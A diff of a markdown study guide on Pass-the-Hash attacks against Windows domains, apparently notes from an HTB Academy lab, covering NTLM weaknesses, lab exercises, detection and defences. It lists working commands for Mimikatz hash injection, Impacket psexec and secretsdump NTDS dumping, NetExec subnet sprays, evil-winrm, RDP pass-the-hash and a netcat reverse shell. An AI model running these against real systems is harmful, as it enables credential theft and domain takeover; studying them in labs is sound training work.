@@ -1,4 +1,4 @@
-# Pass the Hash (PtH) Attacks
+# ⚔️ Pass-the-Hash Techniques
 
 ## 🎯 Overview
 
@@ -9,13 +9,16 @@
 ## 🧠 Windows NTLM Authentication Protocol
 
 ### NTLM Overview
+
 **Microsoft's Windows New Technology LAN Manager (NTLM)** is a set of security protocols that:
-- Authenticates users' identities  
-- Protects data integrity and confidentiality
-- Provides Single Sign-On (SSO) functionality
-- Uses challenge-response protocol for verification
+
+* Authenticates users' identities
+* Protects data integrity and confidentiality
+* Provides Single Sign-On (SSO) functionality
+* Uses challenge-response protocol for verification
 
 ### NTLM Vulnerabilities
+
 ```bash
 # Key weaknesses exploited in PtH attacks:
 1. Passwords stored without salt on servers/domain controllers
@@ -26,6 +29,7 @@
 ```
 
 ### Hash Acquisition Methods
+
 ```bash
 # Common methods to obtain NTLM hashes:
 1. Local SAM database dumping (compromised host)
@@ -40,6 +44,7 @@
 ### 1. Mimikatz - sekurlsa::pth Module
 
 #### Basic Mimikatz PtH Syntax
+
 ```cmd
 # Required parameters for sekurlsa::pth
 /user     - Username to impersonate
@@ -49,6 +54,7 @@
 ```
 
 #### Mimikatz PtH Execution
+
 ```cmd
 # Example: Pass the Hash for user julio
 mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
@@ -64,6 +70,7 @@ mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06
 ```
 
 #### Post-Exploitation with Mimikatz
+
 ```cmd
 # After Mimikatz PtH, use the spawned cmd.exe for:
 net use \\DC01\julio /persistent:no
@@ -78,13 +85,15 @@ net view \\DC01
 ### 2. Invoke-TheHash - PowerShell PtH Framework
 
 #### Invoke-TheHash Overview
-- **Collection of PowerShell functions** for PtH attacks
-- **WMI and SMB execution** methods available  
-- **.NET TCPClient** for network connections
-- **NTLMv2 authentication** protocol implementation
-- **No local admin required** (client-side)
+
+* **Collection of PowerShell functions** for PtH attacks
+* **WMI and SMB execution** methods available
+* **.NET TCPClient** for network connections
+* **NTLMv2 authentication** protocol implementation
+* **No local admin required** (client-side)
 
 #### Required Parameters
+
 ```powershell
 # Core parameters for Invoke-TheHash
 -Target    # Hostname or IP address
@@ -95,6 +104,7 @@ net view \\DC01
 ```
 
 #### SMB Method with Invoke-TheHash
+
 ```powershell
 # Import Invoke-TheHash module
 Import-Module .\Invoke-TheHash.psd1
@@ -110,6 +120,7 @@ Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Ha
 ```
 
 #### WMI Method with Reverse Shell
+
 ```powershell
 # Step 1: Start Netcat listener
 .\nc.exe -lvnp 8001
@@ -128,6 +139,7 @@ Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F1
 ### 1. Impacket PtH Tools
 
 #### impacket-psexec
+
 ```bash
 # Basic PsExec with hash  
 impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
@@ -145,6 +157,7 @@ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660
 ```
 
 #### Other Impacket PtH Tools
+
 ```bash
 # WMI command execution
 impacket-wmiexec administrator@TARGET -hashes :NTHASH
@@ -160,7 +173,9 @@ impacket-secretsdump domain/user@TARGET -hashes :NTHASH
 ```
 
 #### Advanced PtH + VSS Extraction
+
 **Scenario**: Use existing compromised hash to extract additional credentials via Volume Shadow Copy
+
 ```bash
 # Use PtH with VSS to dump NTDS.dit and SYSTEM registry
 impacket-secretsdump -hashes :30B3783CE2ABF1AF70F77D0660CF3453 administrator@10.129.206.60 -use-vss
@@ -176,20 +191,23 @@ impacket-secretsdump -hashes :NTHASH administrator@TARGET -use-vss -outputfile d
 ```
 
 **Why VSS + PtH is Powerful:**
-- **No LSASS dumping** - VSS reads from disk, avoiding memory detection
-- **Complete domain dump** - Extract all domain user hashes at once  
-- **Stealth extraction** - Uses legitimate Windows VSS service
-- **Hash chaining** - Use one hash to get hundreds more
+
+* **No LSASS dumping** - VSS reads from disk, avoiding memory detection
+* **Complete domain dump** - Extract all domain user hashes at once
+* **Stealth extraction** - Uses legitimate Windows VSS service
+* **Hash chaining** - Use one hash to get hundreds more
 
 **VSS Requirements:**
-- Administrator/Local Admin privileges
-- Target must be Domain Controller
-- VSS service enabled (default on Windows Server)
-- Sufficient disk space for shadow copy
+
+* Administrator/Local Admin privileges
+* Target must be Domain Controller
+* VSS service enabled (default on Windows Server)
+* Sufficient disk space for shadow copy
 
 ### 2. NetExec (CrackMapExec) PtH Attacks
 
 #### Basic NetExec PtH
+
 ```bash
 # Single target authentication test
 netexec smb 172.16.1.10 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
@@ -203,6 +221,7 @@ netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3
 ```
 
 #### NetExec Command Execution
+
 ```bash
 # Execute commands with PtH
 netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
@@ -219,6 +238,7 @@ netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3
 ### 3. Evil-WinRM PtH
 
 #### Basic Evil-WinRM Usage
+
 ```bash
 # PowerShell remoting with hash
 evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
@@ -233,6 +253,7 @@ evil-winrm -i TARGET_IP -u administrator@inlanefreight.htb -H NTHASH
 ```
 
 #### Evil-WinRM Post-Exploitation
+
 ```powershell
 # File upload/download
 upload local_file.txt
@@ -247,9 +268,11 @@ net user
 ## 🖥️ RDP Pass the Hash Attacks
 
 ### Prerequisites for RDP PtH
+
 **Restricted Admin Mode** must be enabled on target host.
 
 #### Enable Restricted Admin Mode
+
 ```cmd
 # Add registry key to enable RDP PtH
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
@@ -259,6 +282,7 @@ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestric
 ```
 
 #### RDP PtH with xfreerdp
+
 ```bash
 # Connect using hash instead of password
 xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
@@ -270,6 +294,7 @@ xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 ## 🛡️ UAC and PtH Limitations
 
 ### Local Account Token Filter Policy
+
 ```cmd
 # UAC limitations for local accounts
 Registry Key: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
@@ -283,6 +308,7 @@ Value 1: Even RID-500 Administrator enrolled in UAC protection
 ```
 
 ### Domain vs Local Account Differences
+
 ```bash
 # Domain accounts (No UAC limitations)
 ✅ Full PtH capability against domain-joined machines
@@ -298,13 +324,16 @@ Value 1: Even RID-500 Administrator enrolled in UAC protection
 ## 🎯 HTB Academy Lab Exercises
 
 ### Lab Environment
-- **Target Systems**: MS01 (Windows client) and DC01 (Domain Controller)
-- **Access**: MS01 with tools in `C:\tools` directory
-- **Hash Example**: Administrator `30B3783CE2ABF1AF70F77D0660CF3453`
-- **Domain**: inlanefreight.htb
+
+* **Target Systems**: MS01 (Windows client) and DC01 (Domain Controller)
+* **Access**: MS01 with tools in `C:\tools` directory
+* **Hash Example**: Administrator `30B3783CE2ABF1AF70F77D0660CF3453`
+* **Domain**: inlanefreight.htb
 
 ### Exercise 1: Basic PtH Access
+
 **Objective**: Access target using Pass-the-Hash and read `C:\pth.txt`
+
 ```bash
 # Method 1: Using Impacket
 impacket-psexec administrator@TARGET_IP -hashes :30B3783CE2ABF1AF70F77D0660CF3453
@@ -319,7 +348,9 @@ Get-Content C:\pth.txt
 ```
 
 ### Exercise 2: RDP Registry Configuration
+
 **Objective**: Identify and configure registry value for RDP PtH
+
 ```cmd
 # Answer: DisableRestrictedAdmin
 # Location: HKLM\System\CurrentControlSet\Control\Lsa
@@ -333,7 +364,9 @@ xfreerdp /v:TARGET_IP /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
 ```
 
 ### Exercise 3: Hash Extraction with Mimikatz
+
 **Objective**: Extract David's NTLM hash from current session
+
 ```cmd
 # Connect via RDP with Administrator
 # Navigate to C:\tools and run Mimikatz
@@ -346,7 +379,9 @@ sekurlsa::logonpasswords
 ```
 
 ### Exercise 4: Share Access with David's Hash
+
 **Objective**: Use David's hash to access `\\DC01\david` share
+
 ```cmd
 # Method 1: Using Mimikatz PtH
 mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:DAVID_HASH /domain:inlanefreight.htb /run:cmd.exe" exit
@@ -362,7 +397,9 @@ get david.txt
 ```
 
 ### Exercise 5: Julio Share Access
+
 **Objective**: Use Julio's hash to access `\\DC01\julio` share
+
 ```cmd
 # Extract Julio's hash from Mimikatz output
 # Use hash: 64F12CDDAA88057E06A81B54E73B949B
@@ -374,7 +411,9 @@ type \\DC01\julio\julio.txt
 ```
 
 ### Exercise 6: Reverse Shell with Invoke-TheHash
+
 **Objective**: Create reverse shell from DC01 to MS01 using Julio's hash
+
 ```powershell
 # Step 1: Start Netcat listener on MS01
 C:\tools\nc.exe -lvnp 8001
@@ -393,7 +432,9 @@ Get-Content C:\julio\flag.txt
 ```
 
 ### Optional Exercise: Remote Management Users
+
 **Objective**: Test john's account with Remote Management Users membership
+
 ```bash
 # Test with Impacket (should fail - wrong protocol)
 impacket-psexec inlanefreight.htb/john@MS01 -hashes :JOHN_HASH
@@ -407,6 +448,7 @@ evil-winrm -i MS01 -u john@inlanefreight.htb -H JOHN_HASH
 ## 📋 Pass the Hash Methodology
 
 ### Pre-Attack Requirements
+
 ```bash
 # Hash acquisition methods
 1. Local SAM database dumping
@@ -417,6 +459,7 @@ evil-winrm -i MS01 -u john@inlanefreight.htb -H JOHN_HASH
 ```
 
 ### Attack Decision Matrix
+
 ```bash
 # Windows environment (internal access)
 ✅ Mimikatz sekurlsa::pth - Direct hash injection
@@ -434,6 +477,7 @@ evil-winrm -i MS01 -u john@inlanefreight.htb -H JOHN_HASH
 ```
 
 ### Execution Method Selection
+
 ```bash
 # SMB execution (psexec, smbexec)
 - Service creation and management
@@ -459,6 +503,7 @@ evil-winrm -i MS01 -u john@inlanefreight.htb -H JOHN_HASH
 ## 🛡️ Detection and Defense
 
 ### Detection Indicators
+
 ```bash
 # Network-based detection
 - Multiple NTLM authentication attempts
@@ -474,6 +519,7 @@ evil-winrm -i MS01 -u john@inlanefreight.htb -H JOHN_HASH
 ```
 
 ### Defense Recommendations
+
 ```bash
 # Authentication hardening
 ✅ Implement LAPS for local administrator passwords
@@ -505,6 +551,6 @@ evil-winrm -i MS01 -u john@inlanefreight.htb -H JOHN_HASH
 7. **Detection challenges** - Legitimate authentication protocols exploited
 8. **Defense strategy** - LAPS, Kerberos, and network segmentation critical
 
----
+***
 
-*This comprehensive guide covers Pass the Hash attack techniques using Windows and Linux tools, based on HTB Academy's Password Attacks module.* 
+_This comprehensive guide covers Pass the Hash attack techniques using Windows and Linux tools, based on HTB Academy's Password Attacks module._
